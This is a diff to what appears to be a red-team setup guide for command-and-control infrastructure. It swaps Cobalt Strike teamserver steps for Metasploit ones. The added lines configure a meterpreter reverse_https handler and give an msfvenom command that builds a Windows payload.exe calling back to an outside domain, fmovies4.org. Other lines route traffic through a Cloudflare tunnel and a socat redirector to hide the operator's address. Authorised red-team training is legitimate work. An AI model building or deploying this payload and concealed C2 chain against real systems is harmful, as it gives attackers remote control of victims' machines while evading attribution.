@@ -137,48 +137,28 @@ ssh -i .ssh/internal.pem c2server@$c2_ipv4
 msfconsole
 # Answer yes to: Would you like to use and setup a new database (recommended)? yes
 
-# Step 5
-# Run Cobalt Strike Server 
-# ssh to Bastion then ssh to C2 Server
-# Obtain/create Malleable C2 Profile
-# You pick the {{ cobalt_server_pass }}
-# Leave terminal open or CS server will shutdown
-# In the C2 Server run:
-chmod +x ~/CS491/Server/teamserver ~/CS491/Server/TeamServerImage
-cd ~/CS491/Server/
-sudo ./teamserver {{ c2_ipv4 }} {{ cobalt_server_pass }} {{ c2_profile }}
+# Step 5 Set up Metasploit as a C2
+# [in C2 Server] set up Metasploit listener
+tmux new -s msf
+sudo msfconsole -q
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set ReverseListenerBindAddress 127.0.0.1
+set LHOST 127.0.0.1
+set LPORT 443
+set ExitOnSession false
+run -j
+ctrl+b, "
+msfvenom -p windows/meterpreter/reverse_https ReverseConnectHost=fmovies4.org LPORT=443 -f exe -o payload.exe
 
-# Set up ssh proxy to connect your attack box to your c2 server
-# Leave open or your CS client won't talk to your CS server
-# On your attack box, open a new terminal and run:
-ssh -i {{ project_name }}-bastion.pem -L 50050:{{ c2_ipv4 }}:50050 bastion@{{bastion-ipv6}}
 
-# Redirect IPv6 traffic hitting Redirector to C2 Server
-# Leave terminal open or your beacons won't talk to your CS server
-# On your attack box, open a new terminal
-# ssh to bastion then ssh to redirector
-# In your Redirector run:
-sudo socat TCP6-LISTEN:443,reuseaddr,fork TCP4:{{ c2_ipv4}}:443
+# [in Redirector] Run Cloudflare Tunneling to mask your IPv6 address and redirect IPv6 traffic hitting Redirector to C2 Server
+tmux new -s cf_socat
+cloudflared --no-autoupdate --protocol http2 --edge-ip-version 6 tunnel run &
+# Change $c2_ipv4
+sudo socat TCP6-LISTEN:443,reuseaddr,fork TCP4:$c2_ipv4:443 &
+ctrl+b, d
 
-# Run Cloudflare Tunneling to mask your IPv6 address
-# Leave terminal open or your Cloudflare tunnel will close
-# On your attack box, open a new terminal
-# ssh into your Bastion then ssh into your Redirector
-# In your Redirector run:
-cloudflared --no-autoupdate --protocol http2 --edge-ip-version 6 tunnel run "{{ project_name }}-c2-tunnel"
-
-# Download & extract the CobaltStrike 7zip onto your Attack Box then run:
-chmod +x ~/CS491/Client/cobaltstrike-client.sh
-
-# Open a new terminal and run:
-./CS491/Client/cobaltstrike-client.sh
-## Fill in:
-## Alias: rbfp@{{ project_name }}
-## Host: 127.0.0.1
-## Port: 50050
-## User: rbfp
-## Password: {{ cobalt_server_pass }}
-```
 ## Troubleshooting
 ### Cloudflare error 1033 when navigating to your domain
 ```bash
